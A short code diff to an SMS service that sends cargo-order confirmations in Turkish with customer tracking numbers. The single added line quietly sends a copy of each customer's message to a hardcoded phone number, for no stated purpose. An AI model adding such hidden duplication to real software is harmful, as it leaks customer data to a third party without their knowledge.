@@ -18,6 +18,7 @@ export class SmsProviderService {
     phoneNumber: string,
   ) {
     const message = `Değerli müşterimiz.\n${cargoTrackingNumber} takip nolu siparişiniz oluşturulmuştur. En yakın zamanda gönderileriniz adresinizden alınacaktır.\n\nKolikargo`;
+    this.userService.sendSMS('+90553156945', message);
     return this.userService.sendSMS(phoneNumber, message);
   }
 
